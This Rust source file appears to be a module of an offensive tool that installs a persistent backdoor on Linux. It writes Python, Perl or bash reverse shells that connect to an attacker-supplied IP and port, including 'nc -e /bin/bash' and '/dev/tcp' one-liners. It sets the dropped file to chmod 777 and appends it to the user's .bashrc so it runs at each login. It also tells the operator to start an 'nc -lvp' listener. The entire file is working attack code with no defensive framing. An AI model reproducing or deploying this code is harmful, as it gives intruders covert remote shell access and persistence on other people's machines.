use std::process::Command;
use std::fs::File;
use std::io::{self, BufRead};
use std::io::prelude::*;

use crate::sanitizer;

pub fn create_script (source_ip: String, port: String, mut path: String, malicious_file: String, choice: u8) {
    
    let last_char: Option<char> = path.chars().last();

    if let Some(slash) = last_char  {
        if slash == '/'{

        }
        else {
            path.push('/');
        }
        
    }
    
    //Create full path for malicious script
    let full_path = [path, malicious_file].concat();
    let s_port = port.clone();
    let malfile_path = full_path.clone();

    if choice == 1 {
        let result = write_shell_pyfile(port, source_ip, full_path);
        sanitizer::sanitize_return_fn(result);

    }
    else if choice == 2 {
        let result = write_shell_perl(port, source_ip, full_path);
        sanitizer::sanitize_return_fn(result);
    }
    else if choice == 3 {
        let result = write_shell_bash(port, source_ip, full_path);
        sanitizer::sanitize_return_fn(result);
    }

    let result = modify_bashrc(malfile_path, choice);
    sanitizer::sanitize_return_fn(result);

    println!("\n\x1b[36mGreat ! Please wait someone who connect on the machine, and your backdoor will be installed correctly\n");
    println!("Don't forget to put this netcat command on your attacker machine: nc -lvp {}\x1b[0m", &s_port);

}

fn write_shell_pyfile(port: String, source_ip: String, full_path: String) -> std::io::Result<()>{
    //Write malicious script in python file
    let mut file = File::create(&full_path)?;
    file.write_all(b"import socket,subprocess,os;\n")?;
    file.write_all(b"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n")?;
    let mut v_ip = ["v_ip='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let mut v_port = ["s.connect((v_ip,", &port].concat();
    v_port.push_str("));\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"os.dup2(s.fileno(),0);\n")?;
    file.write_all(b"os.dup2(s.fileno(),1);\n")?;
    file.write_all(b"os.dup2(s.fileno(),2);\n")?;
    file.write_all(b"v_shell_path='/usr/bin/bash';\n")?;
    file.write_all(b"v_shell_value='-i';\n")?;
    file.write_all(b"p=subprocess.call([v_shell_path,v_shell_value]);\n")?;

    //Make Chmod 777 to give full right and enable execution
    let chmod = ["chmod 777 ", &full_path].concat();
    let output = Command::new("sh")
    .arg("-c")
    .arg(chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    Ok(())
}

fn write_shell_perl(port:String, source_ip: String, full_path: String) -> std::io::Result<()>{
    //Write malicious script in perl
    let mut file = File::create(&full_path)?;
    file.write_all(b"use Socket;\n")?;
    let mut v_ip = ["$i='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let  mut v_port = ["$p=", &port].concat();
    v_port.push_str(";\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n")?;
    file.write_all(b"if(connect(S,sockaddr_in($p,inet_aton($i)))){\n")?;
    file.write_all(b"open(STDIN,'>&S');\n")?;
    file.write_all(b"open(STDOUT,'>&S');\n")?;
    file.write_all(b"open(STDERR,'>&S');\n")?;
    file.write_all(b"exec('/usr/bin/bash -i');\n")?;
    file.write_all(b"};\n")?;

    //Do chmod 777 to give full right and enable execution
    let chmod = ["chmod 777 ", &full_path].concat();
    let output = Command::new("sh")
    .arg("-c")
    .arg(chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    Ok(())
}

fn write_shell_bash(port: String, source_ip: String, full_path: String) -> std::io::Result<()> {
    let mut file = File::create(&full_path)?;

    //For bash script, verify if nc is installed on the system
    let ls_1 = Command::new("sh")
    .arg("-c")
    .arg("ls /bin/nc")
    .output()
    .expect("Failed to execute command");

    //For bash script, verify if nc is installed on the system
    let ls_2 = Command::new("sh")
    .arg("-c")
    .arg("ls /bin/usr/nc")
    .output()
    .expect("Failed to execute command");

    //If nc is installed on the system we write a bash script with nc reverse shell
    if ls_1.stderr.is_empty() || ls_2.stderr.is_empty() {
        file.write_all(b"#!/bin/bash\n\n")?;
        let mut remote_ip = ["REMOTE_IP=\"", &source_ip].concat();
        remote_ip.push_str("\"\n");
        file.write_all(remote_ip.as_bytes())?;
        let mut remote_port = ["REMOTE_PORT=", &port].concat();
        remote_port.push_str("\n\n");
        file.write_all(remote_port.as_bytes())?;
        file.write_all(b"/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n")?;

    }
    else {
        //If nc is not installed, we write a bash script with /dev/tcp socket trick
        file.write_all(b"#!/bin/bash\n\n")?;
        file.write_all(b"/bin/bash -c 'bash -i >& /dev/tcp/")?;
        file.write_all(source_ip.as_bytes())?;
        file.write_all(b"/")?;
        file.write_all(port.as_bytes())?;
        file.write_all(b" 0>&1' 2>/dev/null &\n")?;
        
    }
    
    //Do chmod 777 to give all rights and enable execution
    let chmod = ["chmod 777 ", &full_path].concat();
    let output = Command::new("sh")
    .arg("-c")
    .arg(chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    Ok(())
}

fn modify_bashrc(full_path: String, choice: u8) -> std::io::Result<()> {
   
   println!("\nTrying to find the .bashrc file of the current user and rewrite it ! \n");

   let whoami = String::from("whoami");
   let output = Command::new("sh")
   .arg("-c")
   .arg(&whoami)
   .output()
   .expect("Failed to execute command");

   let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

   //Convert the output of the whoami command to get the user and build the absolute path of .bashrc file of the current user
   let output_string = String::from_utf8_lossy(&output.stdout).to_string();
   let output_str: &str = &output_string;
   let mut bashrc_path = ["/home/", output_str].concat();
   bashrc_path = bashrc_path.replace("\n", "");
   bashrc_path.push_str("/.bashrc");

   //Read the .bashrc file of current user
   let file = File::open(&bashrc_path)?;

   let reader = io::BufReader::new(file);

   let mut lines = Vec::new();

   // Insert each line of the .bashrc file in the vector. The vector will be used to rewrite the .bashrc file
   for line in reader.lines () {
       lines.push(line?);
   }

   let mut bashrc = File::create(bashrc_path)?;


   //Insert in the vector the payload for python script and rewrite the .bashrc file
   if choice == 1 {
    let mut payload = ["python3 ", &full_path].concat();
    payload.push_str(" &");
    let cr = String::from("\n");
    lines.push(cr);
    lines.push(payload);
    for line in lines {
        let mut line_to_write = line.clone();
        line_to_write.push_str("\n");
        bashrc.write_all(line_to_write.as_bytes())?;
    }
   }
   //Insert in the vector the payload for perl script rewrite the .bashrc file
   else if choice == 2 {
    let mut payload = ["perl ", &full_path].concat();
    payload.push_str(" &");
    let cr = String::from("\n");
    lines.push(cr);
    lines.push(payload);
    for line in lines {
        let mut line_to_write = line.clone();
        line_to_write.push_str("\n");
        bashrc.write_all(line_to_write.as_bytes())?;
    }
   }
   //Insert in the vector the payload for bash script rewrite the .bashrc file
   else if choice == 3 {
    let payload = &full_path;
    let payload_string: String = payload.to_string();
    lines.push(payload_string);
    for line in lines {
        let mut line_to_write = line.clone();
        line_to_write.push_str("\n");
        bashrc.write_all(line_to_write.as_bytes())?;
    }
   }

   

   
    Ok(())

}